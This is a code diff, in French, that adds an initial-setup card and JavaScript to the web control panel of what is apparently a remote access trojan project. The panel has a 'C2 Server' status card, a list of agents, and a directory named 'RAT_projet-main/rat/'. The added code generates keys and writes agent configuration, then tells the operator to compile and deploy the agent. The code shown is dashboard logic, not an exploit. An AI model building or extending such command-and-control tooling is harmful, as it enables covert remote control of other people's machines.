@@ -304,7 +304,27 @@
         </header>
 
         <div class="grid">
+            <!-- Setup Card -->
+            <div class="card" id="setupCard">
+                <h2>⚙️ Configuration initiale
+                    <span id="setupBadge" class="status-badge"
+                        style="font-size:0.75rem; background:rgba(239,68,68,0.15); color:#ef4444;">Non configuré</span>
+                </h2>
+                <p class="info-text" style="margin-top:0">Génère automatiquement les clés cryptographiques et crée les
+                    fichiers <code>agent.env</code> et <code>.env</code>.</p>
+                <div class="form-group">
+                    <label for="setupServerUrl">URL du serveur C2 (auto-détectée)</label>
+                    <input type="text" id="setupServerUrl" placeholder="Chargement de l'IP...">
+                </div>
+                <button class="btn" onclick="runSetup()" id="setupBtn">
+                    🔑 Générer les clés &amp; Configurer
+                </button>
+                <div class="loader" id="setupLoader" style="display:none; margin-top:0.75rem;"></div>
+                <div class="terminal" id="setupTerminal" style="margin-top:0.75rem; height:100px; display:none;"></div>
+            </div>
+
             <!-- Server Card -->
+
             <div class="card">
                 <h2>C2 Server <div class="status-badge" id="serverStatusBadge">
                         <div class="status-dot inactive" id="serverStatusDot"></div>
@@ -688,10 +708,70 @@
             }
         }
 
+        // ─── Setup / Init ─────────────────────────────────────────────
+        async function checkSetupStatus() {
+            try {
+                const res = await fetch(`${API}/setup/status`);
+                const data = await res.json();
+                const badge = document.getElementById('setupBadge');
+                const urlInput = document.getElementById('setupServerUrl');
+                if (data.has_keys) {
+                    badge.style.background = 'rgba(16,185,129,0.15)';
+                    badge.style.color = '#10b981';
+                    badge.innerText = '✅ Configuré';
+                    if (data.server_url) urlInput.value = data.server_url;
+                } else {
+                    badge.style.background = 'rgba(239,68,68,0.15)';
+                    badge.style.color = '#ef4444';
+                    badge.innerText = 'Non configuré';
+                    urlInput.value = data.local_ip ? `http://${data.local_ip}:8080` : '';
+                }
+            } catch (e) { /* ignore */ }
+        }
+
+        async function runSetup() {
+            const urlInput = document.getElementById('setupServerUrl');
+            const term = document.getElementById('setupTerminal');
+            const btn = document.getElementById('setupBtn');
+            const loader = document.getElementById('setupLoader');
+
+            const server_url = urlInput.value.trim() || '';
+            term.style.display = 'block';
+            term.innerHTML = '<span style="color:#f59e0b">⏳ Génération des clés en cours (peut prendre ~30s si cargo compile)...</span>';
+            btn.disabled = true;
+            loader.style.display = 'inline-block';
+
+            try {
+                const res = await fetch(`${API}/setup/init`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ server_url })
+                });
+                const data = await res.json();
+                if (res.ok && data.status === 'success') {
+                    term.innerHTML = `<span style="color:#10b981">✅ ${data.message}
+🌐 Server URL : ${data.server_url}
+🔑 Public Key : ${data.public_key}
+
+agent.env et .env ont été créés dans RAT_projet-main/rat/
+Tu peux maintenant compiler et déployer l'agent !</span>`;
+                    checkSetupStatus();
+                } else {
+                    term.innerHTML = `<span style="color:#ef4444">Erreur : ${data.message}</span>`;
+                }
+            } catch (e) {
+                term.innerHTML = `<span style="color:#ef4444">Erreur réseau : ${e.message}</span>`;
+            } finally {
+                btn.disabled = false;
+                loader.style.display = 'none';
+            }
+        }
+
         // ─── Init ─────────────────────────────────────────────────────────
         setInterval(checkServerStatus, 5000);
         setInterval(refreshAgents, 10000);
         checkServerStatus();
+        checkSetupStatus();
         refreshAgents();
         loadBuiltAgents();
     </script>
